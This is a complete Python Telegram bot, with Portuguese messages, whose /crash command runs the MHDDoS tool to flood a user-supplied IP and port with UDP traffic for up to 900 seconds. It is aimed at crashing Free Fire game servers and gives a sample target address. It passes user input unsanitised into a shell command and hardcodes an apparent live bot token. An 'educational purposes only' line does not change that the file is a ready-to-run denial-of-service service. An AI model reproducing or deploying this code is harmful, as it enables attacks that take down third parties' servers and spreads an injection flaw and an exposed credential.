import os
import subprocess
import requests
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from threading import Lock
import time
import telebot

BOT_TOKEN = "7540053154:AAE7dArCFnKCcfk6QsQV5gt5NjjmohXoXLk"
ADMIN_ID = 1775563404
MHDDoS_PATH = os.path.abspath("./MHDDoS")
ALLOWED_GROUPS = [-1002256652548]

bot = telebot.TeleBot(BOT_TOKEN)
active_attacks = {}
lock = Lock()

@bot.message_handler(commands=["start"])
def handle_start(message):
    bot.reply_to(
        message,
        "🤖 *Bem-vindo ao Bot de Crash [Free Fire]!*\n\n"
        "📌 *Como usar:*\n"
        "`/crash <IP/HOST:PORTA> <SEGUNDOS>`\n\n"
        "💡 *Exemplo:*\n"
        "`/crash 143.92.125.230:10013 300`\n\n"
        "⚠️ *Atenção:* Este bot foi criado apenas para fins educacionais.",
        parse_mode="Markdown",
    )

@bot.message_handler(commands=["crash"])
def handle_crash(message):
    if message.chat.id not in ALLOWED_GROUPS:
        return

    telegram_id = message.from_user.id
    args = message.text.split()

    if len(args) != 3 or ":" not in args[1]:
        bot.reply_to(
            message,
            "❌ *Formato inválido!*\n\n"
            "📌 *Uso correto:*\n"
            "`/crash <IP/HOST:PORTA> <SEGUNDOS>`\n\n"
            "💡 *Exemplo:*\n"
            "`/crash 143.92.125.230:10013 300`",
            parse_mode="Markdown",
        )
        return

    ip_port = args[1]
    duration = int(args[2])

    if duration < 5 or duration > 900:
        bot.reply_to(
            message,
            "❌ *Limite ultrapassado!*\n\n"
            "⏱️ *Duração mínima:* `5 segundos`\n"
            "⏱️ *Duração máxima:* `900 segundos`",
            parse_mode="Markdown",
        )
        return

    ip = ip_port.split(":")[0]
    response = requests.get(f"http://ipwhois.app/json/{ip}")
    if response.status_code == 200:
        data = response.json()
        country = data.get("country", "Desconhecido")
        org = data.get("org", "Desconhecida")
    else:
        country = "Desconhecido"
        org = "Desconhecida"

    attack_type = "UDP"
    threads = "10"
    command = f"cd {MHDDoS_PATH} && python3 start.py {attack_type} {ip_port} {threads} {duration}"

    with lock:
        process = subprocess.Popen(
            command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        if telegram_id not in active_attacks:
            active_attacks[telegram_id] = []
        active_attacks[telegram_id].append((process, time.time() + duration))

    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("❌ Parar ataque", callback_data=f"stop_{telegram_id}"))

    bot.reply_to(
        message,
        (
            f"Spamming this IP ===> {ip_port} for {duration} seconds.\n\n"
            f"IP location: {country}\n"
            f"Organization: {org}\n"
        ),
        reply_markup=markup,
        parse_mode="Markdown",
    )

@bot.callback_query_handler(func=lambda call: call.data.startswith("stop_"))
def handle_stop_attack(call):
    telegram_id = int(call.data.split("_")[1])

    if call.from_user.id != telegram_id:
        bot.answer_callback_query(
            call.id, "❌ Apenas o usuário que iniciou o ataque pode pará-lo."
        )
        return

    if telegram_id in active_attacks:
        with lock:
            processes = active_attacks[telegram_id]
            for process, _ in processes:
                process.terminate()
            del active_attacks[telegram_id]

        bot.answer_callback_query(call.id, "✅ Ataque parado com sucesso.")
        bot.edit_message_text(
            "*[⛔] ATAQUE ENCERRADO [⛔]*",
            chat_id=call.message.chat.id,
            message_id=call.message.id,
            parse_mode="Markdown",
        )
        time.sleep(3)
        bot.delete_message(chat_id=call.message.chat.id, message_id=call.message.id)
    else:
        bot.answer_callback_query(call.id, "❌ Nenhum ataque ativo encontrado.")

def monitor_attacks():
    while True:
        with lock:
            for telegram_id, processes in list(active_attacks.items()):
                for process, end_time in list(processes):
                    if time.time() > end_time:
                        process.terminate()
                        processes.remove((process, end_time))
                        if not processes:
                            del active_attacks[telegram_id]
        time.sleep(1)

if __name__ == "__main__":
    import threading
    threading.Thread(target=monitor_attacks, daemon=True).start()
    bot.infinity_polling()
